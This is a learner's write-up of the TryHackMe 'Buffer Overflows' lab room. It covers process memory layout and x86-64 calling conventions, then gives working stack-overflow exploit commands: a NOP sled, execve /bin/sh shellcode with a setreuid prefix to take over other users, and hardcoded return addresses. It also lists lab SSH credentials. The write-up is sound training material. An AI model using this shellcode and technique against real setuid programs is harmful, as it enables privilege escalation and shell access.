<p align="center">December 5, 2024</p>
<p align="center">Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{213}}$$-day-streak in  <a href="https://tryhackme.com/r/hacktivities">TryHackMe</a>.</p>

<h1 align="center">
  $$\textcolor{#3bd62d}{\textnormal{Buffer Overflows}}$$
</h1>
<p align="center">Learn how to get started with basic Buffer Overflows!</p>
<p align="center">Note that only subscribers can deploy virtual machines in this room, <a href="https://tryhackme.com/r/room/bof1">Buffer Overflows</a>.</p>
                                                              
<p align="center">
  <img height="150px" hspace="20" src="https://github.com/user-attachments/assets/7d2f56e1-61ae-4e90-916b-bc88a6900314">
  <img width="900px" src="https://github.com/user-attachments/assets/29dc99b5-9952-45c1-a87a-ebee326f1b50">
</p>


<h2>Introduction</h2>
<p>In this room, we aim to explore simple stack buffer overflows(without any mitigations) on x86-64 linux programs. We will use <a href="https://github.com/radareorg/radare2">radare2</a> (r2) to examine the memory layout. You are expected to be familiar with x86 and r2 for this room. </p>
<p>We have included a virtual machine with all the resources to ensure you have the correct environment and tools to follow along. To access the machine via SSH, use the following credentials:
- Username: user1
- Password: user1password</p>

![image](https://github.com/user-attachments/assets/22c39b6d-3e68-45ca-9515-6ba0ae8753c4)

<h2>Process Layout</h2>
<p>When a program runs on a machine, the computer runs the program as a process. Current computer architecture allows multiple processes to be run concurrently(at the same time by a computer). While these processes may appear to run at the same time, the computer actually switches between the processes very quickly and makes it look like they are running at the same time. Switching between processes is called a context switch. Since each process may need different information to run(e.g. The current instruction to execute), the operating system has to keep track of all the information in a process. The memory in the process is organised sequentially and has the following layout: </p>

![image](https://github.com/user-attachments/assets/3c46bb71-1aed-4414-a5e5-b237c73ed6aa)



- User stack contains the information required to run the program. This information would include the current program counter, saved registers and more information(we will go into detail in the next section). The section after the user stack is unused memory and it is used in case the stack grows(downwards)<br>

- Shared library regions are used to either statically/dynamically link libraries that are used by the program.<br>

- The heap increases and decreases dynamically depending on whether a program dynamically assigns memory. Notice there is a section that is unassigned above the heap which is used in the event that the size of the heap increases.<br>

- The program code and data stores the program executable and initialised variables.

![image](https://github.com/user-attachments/assets/e2c0f388-2df4-486b-828d-f07fb8c42421)


<h2>x86-64 Procedures</h2>


<h3 align="center"> <img width="750px" src="https://github.com/user-attachments/assets/0d37f979-19c2-432b-beab-ae9114721232"> <br>
<img width="750px" src="https://github.com/user-attachments/assets/d03f4213-be35-41e4-b0ef-e310b7542bbe"><br>
<img width="750px" src="https://github.com/user-attachments/assets/395d19d5-bf56-4514-8b20-5c3c97b655d6"></h3>



![image](https://github.com/user-attachments/assets/21a2694e-4ccc-4d1e-86d6-8c000540a81b)


<h2>Procedures Continued</h2>

<h3 align="center"> <img width="750px" src="https://github.com/user-attachments/assets/5d8a4a1d-97fd-4479-a6fe-9cdbb07a2eae"> <br>
<img width="750px" src="https://github.com/user-attachments/assets/76cb4f8a-4c89-4071-a915-e2e926a39b0d"><br>
<img width="750px" src="https://github.com/user-attachments/assets/5f5ebecd-32a4-4f6c-bf29-3ce08de9f62b"></h3>

![image](https://github.com/user-attachments/assets/cc08f37d-ccd5-4179-ac32-19f90ce58696)

<h2>Endianess</h2>

<h3 align="center"> <img width="750px" src="https://github.com/user-attachments/assets/6bd0d7a9-4870-4eca-836e-19afb528e8dd"> </h3>

![image](https://github.com/user-attachments/assets/ce6144b4-e320-4aa9-b461-19a30d1ed03c)


<h2>Overwriting Variables</h2>

<h3 align="center"> <img width="750px" src="https://github.com/user-attachments/assets/76edadac-3d99-45ad-aeed-a01ccee1638e"> <br>
<img width="750px" src="https://github.com/user-attachments/assets/c01bb5d7-11ac-4214-a8a2-23095a73c0e3"> </h3>

![image](https://github.com/user-attachments/assets/edbbdd54-b261-4538-8dd4-b88a83ad1a28)


<h2>Overwriting Function Pointers</h2>

<h3 align="center"> <img width="750px" src="https://github.com/user-attachments/assets/aeb7f970-344b-4690-9b56-aedfda67c7ba"> </h3>

<br>

![image](https://github.com/user-attachments/assets/e661e13b-e67f-4167-9243-443e1d7d9088)


<br>
<h2>Buffer Overflows</h2>

![image](https://github.com/user-attachments/assets/871bbd59-feec-4ada-8f0e-1614fd909fdc)

![image](https://github.com/user-attachments/assets/54a05cea-3157-4deb-9227-64e67a529d95)



![image](https://github.com/user-attachments/assets/83a118ec-4cdd-4f98-8ab4-91e1eeacf566)


<p>continuing</p>

<br>


![image](https://github.com/user-attachments/assets/80afc8ec-0403-4c0c-abce-584c5a017392)

<br>

<pre><code>run $(python -c "print 'A'*100+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + 'B'*6")</code></pre>

![image](https://github.com/user-attachments/assets/71f00228-3590-48c6-8dd9-f0f7487c7c47)

<br>

<pre><code>x/100x $rsp-200</code></pre>

![image](https://github.com/user-attachments/assets/40f84f6e-7be8-4ebc-a424-e0133222e500)


<br>

<p>Pay attention!</p>

<pre><code>0x7fffffffe2a8</code></pre>


<pre><code>run $(python -c "print '\x90'*100 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + 'B'*6")</code></pre>

<br>

![image](https://github.com/user-attachments/assets/50fa56f0-5072-4d4c-8d68-fa7f3429c65b)

<br>

<p>0x7fffffffe298 --> 0x98e2ffffff7f --> \x98\xe2\xff\xff\xff\x7f</p>

<br>

<p>Substitute <code>'B'*6</code> by <code>\x98\xe2\xff\xff\xff\x7f</code>.  And whe will have the following ...</p>

<pre><code>./buffer-overflow $(python -c "print '\x90'*100 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\x98\xe2\xff\xff\xff\x7f'")</code></pre>

<br>

![image](https://github.com/user-attachments/assets/50fb5309-5fa8-4e08-84dc-bcaf7ac773a7)

<br>

![image](https://github.com/user-attachments/assets/42493d57-698c-47b3-b5f8-92ef756c91b1)

<br>

<p>we need to access it with <code>user 2</code>.</p>

![image](https://github.com/user-attachments/assets/cf5f11a8-d185-41db-9c31-fcbfb2e99c7a)

<pre><code>cat /etc/passwd</code></pre>

![image](https://github.com/user-attachments/assets/15f2599d-eaa3-4fa4-bce2-c21de1cde749)

<br>

<pre><code>./buffer-overflow $(python -c "print '\x90'*86+'\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\x98\xe2\xff\xff\xff\x7f'")</code></pre>



<br>

![image](https://github.com/user-attachments/assets/31b156b1-4db4-4eb2-9f0f-92810e8b9579)

<br>

<p>omgyoudidthissocool!!</p>

<br>


![image](https://github.com/user-attachments/assets/8090fa54-b464-40bf-9bd4-10c05f9ece77)

<br>

<br>
<h2>Buffer Overflows 2</h2>

![image](https://github.com/user-attachments/assets/dff71db4-0e60-41e9-9c51-83c40e6bced6)

![image](https://github.com/user-attachments/assets/9a6e21ab-93bd-4a5d-b7f2-f0501d14ad1c)

![image](https://github.com/user-attachments/assets/aef228ce-97a2-4438-a1ca-f2de52f77ff5)

![image](https://github.com/user-attachments/assets/9e8e2675-0583-48f6-acbd-c015bd1176ad)

<pre><code>run $(python -c "print('A'*90 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'B'*19 + 'C'*6)")</code></pre>

![image](https://github.com/user-attachments/assets/1995e8ea-eda0-40a4-be28-bd5665fd878b)

<pre><code>./buffer-overflow-2 $(python -c "print('\x90'*90 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*19 + '\x78\xe2\xff\xff\xff\x7f')")
</code></pre>



![image](https://github.com/user-attachments/assets/6a745b72-f5c2-420a-bd9b-b89e5b7b019d)

<br>

![image](https://github.com/user-attachments/assets/f7dd5c61-13d3-403d-aa52-7df22a99f9f2)








<h2>Room Completed<a id='2'></a></h2>
<p>Keep learning, keep growing!<br>

<h3 align="center"> <img width="900px" src="https://github.com/user-attachments/assets/e45a55b3-3f5c-4d6f-8994-860df22cc928"> </h3>

<h3 align="center"> <img width="900px" src="https://github.com/user-attachments/assets/fa25ddd0-0cc8-4ad5-b03a-387b1fd4a703"> </h3>


<h2>My Journey<a id='3'></a></h2>
<p></p>Following I share the status of my journey in TryHackMe.</p>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     |
| :---------------: | :------- | :----------- | :----------- | :---------- | :--------- | :------  | :-------- |
|                   |          | WorldWide    | Brazil       | WorldWide   | Brazil     |          | Completed |
| December 5, 2024  | 213     |      1,032 nd |        22 nd |    8,414 th |      84 th |  59,296  |       454 |

</div>

<h3 align="center"> <img width="900px" src="https://github.com/user-attachments/assets/a363fcf4-c2b2-470f-8595-71887ac94044"> </h3>
